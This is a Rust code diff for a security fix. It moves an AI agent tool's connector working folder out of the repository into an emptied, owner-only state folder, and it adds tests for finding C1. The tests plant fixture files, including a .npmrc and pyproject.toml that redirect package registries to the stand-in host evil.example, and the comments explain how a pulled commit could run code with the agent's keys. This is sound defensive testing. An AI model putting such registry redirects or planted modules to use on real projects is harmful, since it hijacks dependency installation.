@@ -484,25 +484,28 @@ impl fmt::Debug for LaunchSpec {
 /// the model credential.
 pub const KEPT_ENV: [&str; 4] = ["PATH", "HOME", "LANG", "TMPDIR"];
 
-/// The folder a stdio connector runs in: `.farik/local/connectors/<agent>/<server>` under the
-/// project `root`, made owner-only when it is not there. Never a session's worktree, which agents
-/// write to: there `npx` would run a planted `node_modules/.bin`, `python -m` a planted module, and
-/// a relative argument a planted script, on the host with the agent's keys (finding C1).
+/// The folder a stdio connector runs in, outside the repository: `connectors/<project id>/<agent>/
+/// <server>` in the user's state folder `state`, removed and made again, empty and owner-only, for
+/// every listing and launch. Never under the project: git checks out a force-added file there on a
+/// clone or a pull, and `npx` and `uv` look upward to the repository's root for `.npmrc`,
+/// `node_modules/.bin` and `pyproject.toml`, so a pulled commit chose what ran on the host with the
+/// agent's keys (finding C1).
 ///
 /// # Errors
 ///
-/// The folder could not be made.
-pub fn working_folder(
-    root: &std::path::Path,
-    agent: &str,
-    server: &str,
-) -> std::io::Result<PathBuf> {
+/// The folder could not be removed or made.
+pub fn working_folder(state: &std::path::Path, at: &SecretAt) -> std::io::Result<PathBuf> {
     use std::os::unix::fs::DirBuilderExt as _;
 
-    let folder = root
-        .join(".farik/local/connectors")
-        .join(agent)
-        .join(server);
+    let folder = state
+        .join("connectors")
+        .join(&at.project_id)
+        .join(&at.agent_id)
+        .join(&at.server);
+    match std::fs::remove_dir_all(&folder) {
+        Err(error) if error.kind() != std::io::ErrorKind::NotFound => return Err(error),
+        _ => {}
+    }
     std::fs::DirBuilder::new()
         .recursive(true)
         .mode(0o700)
@@ -831,6 +834,72 @@ mod tests {
             0o600
         );
         assert_eq!(at_work.project_id.len(), 32, "{}", at_work.project_id);
+    }
+
+    #[test]
+    fn a_connector_folder_holds_nothing_the_repository_put_there() {
+        // Finding C1: git checks out a force-added file at the folder the server ran in, so a
+        // pulled commit chose what `python -m github_mcp` ran, with the agent's keys.
+        let dir = scratch("planted");
+        let root = dir.join("app");
+        let planted = root.join(".farik/local/connectors/dev-a/github");
+        std::fs::create_dir_all(&planted).expect("the folder is made");
+        std::fs::write(planted.join("github_mcp.py"), "print('PLANTED')").expect("planted");
+        std::fs::set_permissions(&planted, std::fs::Permissions::from_mode(0o755))
+            .expect("the mode is set");
+        let at = SecretAt::of(&root, "dev-a", "github").expect("an address");
+        let state = dir.join("state");
+        let folder = working_folder(&state, &at).expect("the folder is made");
+        assert!(!folder.starts_with(&root), "{}", folder.display());
+        let empty_and_owner_only = |folder: &std::path::Path| {
+            let held: Vec<_> = std::fs::read_dir(folder)
+                .expect("the folder reads")
+                .map(|item| item.expect("an item").file_name())
+                .collect();
+            assert!(held.is_empty(), "{} holds {held:?}", folder.display());
+            assert_eq!(
+                std::fs::metadata(folder)
+                    .expect("it is there")
+                    .permissions()
+                    .mode()
+                    & 0o777,
+                0o700
+            );
+        };
+        empty_and_owner_only(&folder);
+        // What the last run left, or anything else put there, is gone at the next.
+        std::fs::write(folder.join("github_mcp.py"), "print('PLANTED')").expect("planted");
+        std::fs::set_permissions(&folder, std::fs::Permissions::from_mode(0o755))
+            .expect("the mode is set");
+        assert_eq!(working_folder(&state, &at).expect("made again"), folder);
+        empty_and_owner_only(&folder);
+    }
+
+    #[test]
+    fn no_folder_above_a_connector_folder_is_the_repositorys() {
+        // Finding C1: `npx` and `uv` look upward for `.npmrc`, `node_modules/.bin` and
+        // `pyproject.toml`, so the repository's root decided what `npx -y …` and `uv run` ran.
+        let dir = scratch("walk-up");
+        let root = dir.join("app");
+        std::fs::create_dir_all(root.join("node_modules/.bin")).expect("the root is made");
+        for (name, text) in [
+            (".npmrc", "registry=https://evil.example/\n"),
+            ("package.json", "{}"),
+            (
+                "pyproject.toml",
+                "[tool.uv]\nindex-url = \"https://evil.example/\"\n",
+            ),
+        ] {
+            std::fs::write(root.join(name), text).expect("planted");
+        }
+        let at = SecretAt::of(&root, "dev-a", "github").expect("an address");
+        let folder = working_folder(&dir.join("state"), &at).expect("the folder is made");
+        assert!(!folder.starts_with(&root), "{}", folder.display());
+        for above in folder.ancestors() {
+            for name in [".npmrc", "package.json", "pyproject.toml", "node_modules"] {
+                assert!(!above.join(name).exists(), "{}", above.join(name).display());
+            }
+        }
     }
 
     #[test]
